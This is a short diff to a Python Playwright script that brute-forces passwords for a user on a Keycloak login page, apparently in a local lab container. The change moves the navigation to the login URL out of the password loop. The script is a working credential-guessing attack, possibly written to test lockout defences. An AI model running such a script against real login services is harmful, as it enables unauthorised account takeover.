@@ -62,14 +62,13 @@ def main():
         browser = p.chromium.launch(headless=True)
         context = browser.new_context()
         page = context.new_page()
+        page.goto("http://keycloak:8080/auth/realms/master/account")
 
         print(f"Starting brute-force attack for user '{username}'...")
 
         for i, password in enumerate(passwords):
             if (i + 1) % 10 == 0:
                 print(f"Completed {i + 1} attempts")
-
-            page.goto("http://keycloak:8080/auth/realms/master/account")
 
             page.fill('input#username', username)
             page.fill('input#password', password)
